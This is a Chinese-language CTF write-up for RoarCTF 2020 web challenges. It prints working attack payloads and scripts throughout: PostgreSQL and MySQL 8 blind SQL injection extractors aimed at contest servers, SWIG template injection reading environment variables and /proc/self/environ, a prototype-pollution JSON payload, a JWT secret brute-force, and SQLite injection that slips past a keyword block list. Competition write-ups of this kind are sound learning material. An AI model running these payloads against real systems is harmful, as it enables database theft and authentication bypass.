---
layout:     post
title:      RoarCTF-2020-Writeup
subtitle:   tcl
date:       2020-12-8
author:     BY Diego
header-img: https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/64952665_p0.png
catalog: true
tags:
    - WP
    - 比赛
---

## 你能登陆成功吗 && 你能登陆成功吗-reverse



`PostgreSQL`数据库的注入

存在时间盲注

```sql
username=admin&password=' AND 8721=(SELECT 8721 FROM PG_SLEEP(5))-- NwFA
```



利用`and ` 如果第一个条件为真则继续判断下一个条件，否则直接跳过

过滤了空格,直接查`password` ，利用字符串截取



若为真则延时

```sql
'AND/**/(select/**/substring(password,1,1)/**/from/**/users/**/limit/**/1)='A'/**/AND/**/1=(SELECT/**/1/**/FROM/**/PG_SLEEP(1))--/**/NwFA
```



exp

```python
import requests
import urllib

url = r'http://139.129.98.9:30007'

import time
count=0
flag = ""
while 1:
	count+=1
	for x in range(1,127):
		payload = "'AND/**/(select/**/substring(password,{1},1)/**/from/**/users/**/limit/**/1)='{0}'/**/AND/**/1=(SELECT/**/1/**/FROM/**/PG_SLEEP(1))--/**/NwFA".format(chr(x),str(count))
		params = {
			'username':'admin',
			'password':payload
			}
		#print(payload)
		time1 = time.time();
		res = requests.post(url,data=params)
		if time.time()-time1 >1:
			flag+=chr(x)
			print(flag)
			break
```



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/_88DZJUX$%5DIFGYAJMYPAP92.png)



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201206213344.png)





## HTML 在线代码编辑器 



是一个类似如下的在线编写HTML的

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207082253.png)





在主页存在自己编写的文件列表，查看的url为 `views?file=******.html`

输入`views?file=/` 报错



爆出`swig`

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207112119.png)



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207114501.png)



然后就是SWIG模板注入

利用`Object.keys` 获取`process.env`的键

```
{ {Object.keys(process.env)} }
```



也可读文件

```
{ % extends '/proc/self/environ' % }
```





![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207114744.png)



再利用如下即可获取对应值

```
{ {process.env.键值} }
```





## easysql

mysql8 镜像

```bash
docker run -dit --name mysql8 -e MYSQL_ROOT_PASSWORD=password haakco/mysql80
```

```bash
docker exec -it mysql8 bash -c "mysql -u root -p"
```

密码password

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207122337.png)



查库 

```sql
(table information_schema.schemata limit 1)>('def','{0}',null,null,null,null)
```



查表

```sql
(table information_schema.tables order by create_time desc limit 1)>('def','diego','{0}',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null)
```



查列

```sql
(table information_schema.COLUMNS limit 3415,1)>('def','diego','users','{0}',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null)
```



`mysql 8.0.21` 可用

```sql
select (table information_schema.TABLESPACES_EXTENSIONS limit 7,1)>('',null)
```

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201208104520.png)

```python
import requests

url = ""

# 0||(table information_schema.tables order by create_time desc limit 1)>('def','diego','{0}',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null) 查表

# (table information_schema.schemata limit 1)>('def','{0}',null,null,null,null) 查库

#(table information_schema.COLUMNS limit 3415,1)>('def','diego','users','{0}',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null) 查列

#0||(table information_schema.TABLESPACES_EXTENSIONS limit 5,1)>('{0}',NULL) 查库 查表
result = ''
flag = ''

for x in range(1,15) :
	max = 127
	min = 32
	mid = (max + min) //2

	while min <max :
		payload = "0||(table information_schema.TABLESPACES_EXTENSIONS limit 5,1)>('{0}',NULL)".format(flag + chr(mid)+ chr(1))
		params = { 'id': payload}	
		try:
			res = requests.get(url,params = params)
			print(payload,res.text)
			if "1" in res.text :   # zhen
				min = mid +1
			else:
				max = mid
		except Exception as e:
			print  e
		mid = (max + min)// 2

	flag += chr(mid-1)
	print flag
```





因为flag表只有一列，获取flag 

```python
import requests

url = "http://139.129.98.9:30003/login.php"

char = ""

while 1:
	for x in range(ord('0')-1,ord('H')+2):
		data = {
			"username":"admin'and('{0}')>hex((table/**/f11114g/**/limit/**/1,1))#".format(char+chr(x)),
			"password":"aa"
		}
		res = requests.post(url,data =data)
		#print res.text
		if "password" in res.text:
			print(res.text,char+chr(x))
			char += chr(x-1)
			break
	print(char)
```



## 快乐圣诞 cei 叮壳



源码

```javascript
const express = require('express');
const path = require('path');
const hbs = require('hbs');
const crypto = require('crypto');
const bodyParser = require('body-parser');
const cookieParser = require("cookie-parser");
const session = require('express-session');
const FileStore = require('session-file-store')(session);
const app = express();
const env = require('dotenv').config();
const expressJwt = require("express-jwt");
const jwt = require('jsonwebtoken')
const fs = require('fs')
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database(__dirname + "/db.db");

app.use(express.static(path.join(__dirname, 'public')))
app.use(bodyParser.urlencoded({ extended: true }))
app.use(bodyParser.json());
app.use(cookieParser());
app.use(expressJwt({
    secret : env.parsed.rockyou,
    algorithms : ["HS256"],
    credentialsRequired : false,
    getToken: function fromCookie (req) {
        if ( req.cookies.token && req.cookies.token.slice(0,2) === 'ey') {
            return req.cookies.token;
        }
        return null
    }
}).unless(
    { path : ['/', '/source', '/start', '/logout']}
))

app.use(session({
    name: "game",
    secret: env.parsed.SessionSecr3t,
    resave: false,
    saveUninitialized: true,
    store: new FileStore({path: __dirname+'/sessions/'})
}));
app.use( (err, req, res, next) => {
    if (err.name === 'UnauthorizedError') {
        res.status(401).send('invalid token')
    }
})
app.set('views', path.join(__dirname, "views/"))
app.engine('html', hbs.__express)
app.set('view engine', 'html')


function md5(s)
{
    return crypto.createHash('md5').update(s).digest('hex')
}

function judge_who_win(player1, player2) {
    if (player1 === player2)
        return "draw"
    if ( player1 === "1" )
    {
        if (player2 === "3")
            return "player1"
    }
    if ( player1 === "2" )
    {
        if (player2 === "1")
            return "player1"
    }
    if ( player1 === "3" )
    {
        if (player2 === "2")
            return "player1"
    }
    return "player2"
}

function randomNum(minNum,maxNum){
    switch(arguments.length){
        case 1:
            return parseInt(Math.random()*minNum+1,10);
        case 2:
            return parseInt(Math.random()*(maxNum-minNum+1)+minNum,10);
        default:
            return 0;
    }
}

var player = {}
const want_to_eat = ["1", "2", "3", "4"]

app.get('/', (req, res) => {
    res.render("home")
})

app.get("/source", function (req, res) {
    res.sendfile(__dirname + "/app.js")
})


app.post('/', (req, res) => {
    if (!req.body || typeof req.body !== 'object' )
    {
        res.redirect("/")
        return
    }

    player = {
        name : "player",
        award : "Turkey",
        want_to_eat : "1",
    }

    req.session.name = "player"
    req.session.award = "Turkey"
    req.session.want_to_eat = "1"

    let tempPlayer = req.body

    for ( let i in tempPlayer ) {
        if (player[i]) {
            if ((i === "name" && typeof tempPlayer[i] != 'string') || i === "award" || 
                (i === "want_to_eat" && !want_to_eat.includes(tempPlayer[i])))
            {
                player = {}
                res.end("?")
                return;
            }

            player[i] = tempPlayer[i]

            if (i === "want_to_eat") {
                switch (tempPlayer[i]) {
                    case "1" :
                        player.award = "Turkey";
                        break;
                    case "2" :
                        player.award = "Goose";
                        break;
                    case "3" :
                        player.award = "Buchedenoel";
                        break;
                    case "4" :
                        player.award = "Corn porridge";
                        break;
                }
            }
        }
    }

    const token = jwt.sign (
        {
            id : player.want_to_eat,
            is_win : "false"
        }, env.parsed.rockyou, {
            expiresIn: 3600 * 12
        }
    )
    res.cookie("token", token, {
        maxAge: 3600 * 12,
        httpOnly: true
    });

    res.redirect("/start")
})

app.get('/start', (req, res)=>{
    if ( !req.cookies.token )
    {
        res.status(403).send("you are not allowed to visit this page")
        return
    }

    if ( player.name )
    {
        for (let i in player)
        {
            if (req.session.hasOwnProperty(i))
                req.session[i] = player[i]
            else {
                res.end("Do you think i am stupid?")
                player = {}
                req.session.destroy()
                return
            }
        }
        player = {}
    }
    req.session.is_win = "false"
    res.render("start", {"santa" : req.session.santa, "player" : req.session.won, "name" : req.session.name})
})

app.post('/start', (req, res)=>{
    if ( !req.cookies.token || !req.session.name )
    {
        res.status(403).send("you are not allowed to visit this page")
        return
    }

    if ( !req.session.won )
        req.session.won = 0

    if ( !req.session.santa )
        req.session.santa = 0


    let result = ""
    if ( req.body.player )
    {
        let santa_rps = randomNum(1,3).toString()
        let player_rps = req.body.player
        let rps = ["1","2","3"] //1:rock  2:paper  3:scissor

        if (typeof player_rps !== 'string' )
        {
            res.send("?")
            return
        }
        if (!rps.includes(player_rps))
        {
            res.send("?")
            return
        }

        switch (judge_who_win(santa_rps, player_rps)) {
            case "draw" : result="平手";break
            case "player1" : req.session.santa+=1;result="很遗憾，你输了";break
            case "player2" : req.session.won+=1;result=`恭喜你，胜利了`;break
        }

    }

    // 赢100次你就胜利了哦
    if (req.session.won >= 100)
    {
        console.log("you won")
        const token = jwt.sign (
            {
                id : req.session.want_to_eat,
                is_win : "true"
            }, env.parsed.rockyou, {
                expiresIn: 3600 * 12
            }
        )
        res.cookie("token", token, {
            maxAge: 3600 * 12,
            httpOnly: true
        });
        req.session.is_win = "true"
        res.redirect("/award")
        return
    }

    // 如果圣诞老人赢了5次那么你就输了
    if ( req.session.santa > 5 )
    {
        req.session.destroy()
        res.render("failed")
        return;
    }

    res.render("start", {"result" : result, "santa" : req.session.santa, "player" : req.session.won, "name" : req.session.name})
})

app.get('/logout', (req, res) => {
    req.session.destroy()
    res.redirect("/")
})

app.get("/award", (req, res)=> {
    //session+jwt 双重保障
    if (!req.user || !req.user.id || !req.session.is_win)
    {
        res.status(403).end("Forbidden")
        return
    }
    if (req.user.is_win !== 'true' || req.session.is_win !== 'true' )
    {
        res.status(403).end("Too young too simple")
        returnz
    }


    let patt = /union|like|pragma|savepoint|vacuum|detach|alter|attach|insert|update|release|rollback|load|create|drop|delete|explain|regexp|=|>|<|"|'/i
    if ( req.user.id.match(patt) )
    {
        res.status(403).end("Never Trust Your User")
        return
    }

    db.get(`SELECT ITEM,LOG FROM AWARD WHERE id=${req.user.id}`,function(err,row){
        if (!row) {
            res.render("reward", {"award": "", "log": ""})
            return
        }
        if (row["ITEM"] && row["LOG"]){
            res.render("reward", {"award": row["ITEM"], "message" : row["LOG"]} )
        } else res.render("reward", {"award": "", "log": ""})
    })
})



app.listen(80, "0.0.0.0");
```



需要到100分才能注入拿到flag





关键代码

如下存在`原型链污染`

路由为 `POST /`

```javascript
player[i] = tempPlayer[i]
```



发送如下数据

```json
{
	"__proto__": {"won":"999999999"},
	"want_to_eat": "3"
}
```

本地测试 响应改掉了

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207170544.png)



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207170736.png)



给player 污染了一个属性

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207170812.png)







然后`GET /start`中 存在如下代码，会将player的属性赋值给 `session`，前提是`session`有这个属性

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207171246.png)





在`POST /start`中会对won 进行定义

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207172750.png)



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207172813.png)





所以访问顺序为

`POST /` -> 污染palyer

`POST /start` -> 给session初始化 won属性

`GET /start` ->  将污染的player的won属性 赋值给 session



最终`session.won=999999999`

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207174758.png)



但利用点存在如下限制

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207175436.png)



单纯赋值999999 并没什么用 所以还要经过如下一步，再次访问 `POST/start `

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207175538.png)



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207175643.png)

再带着得到的token访问 `GET /award`



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207175753.png)



最终顺序为 

所以访问顺序为

`POST /` -> 污染palyer

`POST /start` -> 给session初始化 won属性

`GET /start` ->  将污染的player的won属性 赋值给 session

`POST/start  `->  利用污染session.won值 从而给 session.is_win 、token.is_win 属性赋值为 true

最后访问 `GET /award`



之后就是获取jwt 的key

通过如下猜测使用`rockyou`字典 然后爆破伪造 id

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201207180137.png)



之后就是sqlite 注入

```javascript
let patt = /union|like|pragma|savepoint|vacuum|detach|alter|attach|insert|update|release|rollback|load|create|drop|delete|explain|regexp|=|>|<|"|'/i
    if ( req.user.id.match(patt) )
    {
        res.status(403).end("Never Trust Your User")
        return
    }

    db.get(`SELECT ITEM,LOG FROM AWARD WHERE id=${req.user.id}`,function(err,row){
        if (!row) {
            res.render("reward", {"award": "", "log": ""})
            return
        }
        if (row["ITEM"] && row["LOG"]){
            res.render("reward", {"award": row["ITEM"], "message" : row["LOG"]} )
        } else res.render("reward", {"award": "", "log": ""})
    })
```



布尔盲注，过滤了`like > < = ' " regexp`

可以利用`glob` 子句 类似 `like`

*SQLite 的 **GLOB** 运算符是用来匹配通配符指定模式的文本值。如果搜索表达式与模式表达式匹配，GLOB 运算符将返回真（true），也就是 1。与 LIKE 运算符不同的是，GLOB 是大小写敏感的，对于下面的通配符，它遵循 UNIX 的语法。*

```sql
select substr((SELECT group_concat(name) FROM sqlite_master),1,1) glob char(116)
```



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201208113958.png)



或者使用`in` 语句

```sql
select char(116) in (substr((SELECT group_concat(name) FROM sqlite_master),1,1))
```



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201208114841.png)



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/20201208115112.png)